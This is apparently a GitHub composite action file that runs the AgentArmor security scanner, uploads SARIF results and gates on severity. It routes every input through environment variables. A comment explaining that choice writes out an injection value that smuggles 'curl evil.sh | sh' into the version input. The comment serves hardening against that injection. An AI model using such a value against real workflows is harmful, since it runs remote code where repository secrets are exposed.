name: AgentArmor Scan
description: Run AgentArmor security scan and upload SARIF to GitHub Security
branding:
  icon: shield
  color: blue
inputs:
  config:
    description: Path to AgentArmor.toml
    required: false
    default: AgentArmor.toml
  url:
    description: Target API URL (overrides config)
    required: false
  provider:
    description: Cloud provider (openai, anthropic, gemini, ...)
    required: false
  suite:
    description: Benchmark suite name (optional benchmark mode)
    required: false
  fail-on:
    description: Comma-separated severities to fail on
    required: false
    default: HIGH,CRITICAL
  version:
    description: AgentArmor package version
    required: false
    default: "1.5.0"
runs:
  using: composite
  steps:
    # Every input reaches the shell through env, never through an expression inside
    # a run: script. GitHub substitutes expressions into the script text before bash
    # sees it, so an input such as  1.0.0"; curl evil.sh | sh; echo "  becomes shell
    # code. A composite action runs in the caller's runner with the caller's secrets
    # in the environment, which makes that a supply-chain problem for every
    # repository using it rather than a local bug.
    - name: Validate the requested version
      shell: bash
      env:
        VERSION: ${{ inputs.version }}
      run: |
        # Also constrains the git ref below: unvalidated, this input could name any
        # ref in the repository instead of a release tag.
        if ! printf '%s' "$VERSION" | grep -Eq '^[0-9]+\.[0-9]+\.[0-9]+$'; then
          echo "::error::version must look like 1.5.0 (got: $VERSION)"
          exit 1
        fi
    - name: Install AgentArmor
      shell: bash
      env:
        VERSION: ${{ inputs.version }}
        REPO_URL: https://github.com/YashvantHange/AgentArmor.git
      # Installed from the repository, not PyPI: the agentarmor name there belongs to
      # an unrelated project, so installing it fetched someone else's package and the
      # agentarmor command was then not on PATH. This action never worked.
      run: pip install "agentarmor @ git+${REPO_URL}@v${VERSION}"
    - name: Run security scan
      shell: bash
      env:
        SUITE: ${{ inputs.suite }}
        PROVIDER: ${{ inputs.provider }}
        URL: ${{ inputs.url }}
        CONFIG: ${{ inputs.config }}
      run: |
        if [ -n "$SUITE" ]; then
          agentarmor benchmark --provider "${PROVIDER:-openai}"             --suite "$SUITE" -o benchmark.json --format json
          echo "Benchmark complete"
          exit 0
        fi
        if [ -n "$URL" ]; then
          agentarmor scan --url "$URL" --format sarif -o findings.sarif
        elif [ -n "$PROVIDER" ]; then
          agentarmor scan --provider "$PROVIDER" --format sarif -o findings.sarif
        else
          agentarmor scan --config "$CONFIG" --format sarif -o findings.sarif
        fi
    - name: Upload SARIF
      # Only when the scan produced one. An unconditional upload turns a failed scan
      # into a second, more confusing failure pointing at the upload step.
      if: inputs.suite == '' && hashFiles('findings.sarif') != ''
      uses: github/codeql-action/upload-sarif@v3
      with:
        sarif_file: findings.sarif
    - name: Gate on severity
      if: inputs.suite == ''
      shell: bash
      env:
        FAIL_ON: ${{ inputs.fail-on }}
      run: agentarmor gate --sarif findings.sarif --fail-on "$FAIL_ON"
    - name: Upload benchmark artifact
      if: inputs.suite != ''
      uses: actions/upload-artifact@v4
      with:
        name: model-benchmark
        path: benchmark.json
